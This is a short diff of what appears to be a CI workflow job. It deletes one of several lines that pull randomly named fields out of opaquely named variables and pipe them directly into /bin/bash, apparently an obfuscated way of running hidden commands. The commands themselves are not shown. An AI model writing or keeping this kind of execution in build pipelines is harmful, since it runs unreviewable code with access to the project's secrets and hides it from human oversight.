@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$y03" | jq -r .z591 | /bin/bash
           echo $tt4 | jq -r .khz81 | /bin/bash
           printf '%s' "$daw999" | jq -r .xvtn1565 | /bin/bash
-          printf '%s' "$zahy54" | jq -r .qa97 | /bin/bash
           echo $zuc548 | jq -r .ul62431 | /bin/bash
           echo $mfkit1 | jq -r .gocbz3 | /bin/bash
           echo $cih79099 | jq -r .adm9225 | /bin/bash
